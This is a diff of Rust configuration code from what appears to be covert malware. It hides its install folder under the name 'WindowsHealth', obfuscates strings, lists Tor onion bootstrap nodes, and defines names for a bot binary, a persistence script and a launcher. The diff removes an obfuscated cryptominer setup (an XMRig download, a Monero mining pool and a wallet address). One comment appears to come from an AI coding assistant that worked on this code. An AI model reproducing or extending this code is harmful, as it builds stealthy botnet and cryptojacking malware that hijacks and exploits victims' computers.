@@ -16,10 +16,6 @@ pub const CONFIG_FILENAME: &str = "sys_config.dat"; // Don't obfuscate FS names 
 
 pub const INSTALL_DIR_NAME: &str = "WindowsHealth"; 
 
-pub fn get_download_url() -> String { obfstr::obfstr!("https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-windows-x64.zip").to_string() }
-pub fn get_pool_url() -> String { obfstr::obfstr!("gulf.moneroocean.stream:10128").to_string() }
-pub fn get_wallet() -> String { obfstr::obfstr!("47ekr2BkJZ4KgCt6maJcrnWhz9MfMfetPPnQSzf4UyXvAKTAN3sVBQy6R9j9p7toHa9yPyCqt9n43N3psvCwiFdHCJNNouP").to_string() }
-
 // V10 Standard: Failover Bootstrap Nodes
 pub const BOOTSTRAP_ONIONS: [&str; 3] = [
     "vww6ybal4bd7szmgncyruucpgfkqahzddi37ktceo3ah7ngmcopnpyyd.onion:80",
@@ -29,28 +25,14 @@ pub const BOOTSTRAP_ONIONS: [&str; 3] = [
 
 // Dynamic Runtime Configuration
 pub static RUNTIME_CONFIG: Lazy<Mutex<MorphConfig>> = Lazy::new(|| {
-    // Try to load from disk
-    let config_path = get_appdata_dir().join(CONFIG_FILENAME);
-    if config_path.exists() {
-        if let Ok(content) = std::fs::read_to_string(&config_path) {
-            if let Ok(cfg) = serde_json::from_str::<crate::modules::miner::config::MinerConfig>(&content) {
-                // The user's provided edit was syntactically incorrect.
-                // Assuming the intent was to return the morph config,
-                // and the `let _rng = rand::thread_rng();` was a mistake or incomplete thought.
-                // Reverting to the original logic to maintain syntactic correctness.
-                return Mutex::new(cfg.morph);
-            }
-        }
-    }
-    // Fallback / First Run (Generate New)
     Mutex::new(MorphConfig::generate())
 });
 
-pub fn get_miner_exe_name() -> String {
-    RUNTIME_CONFIG.lock().unwrap().miner_exe.clone()
+pub fn get_bot_binary_name() -> String {
+    RUNTIME_CONFIG.lock().unwrap().bot_binary.clone()
 }
-pub fn get_monitor_script_name() -> String {
-    RUNTIME_CONFIG.lock().unwrap().monitor_script.clone()
+pub fn get_persistence_script_name() -> String {
+    RUNTIME_CONFIG.lock().unwrap().persistence_script.clone()
 }
 pub fn get_launcher_script_name() -> String {
     RUNTIME_CONFIG.lock().unwrap().launcher_script.clone()
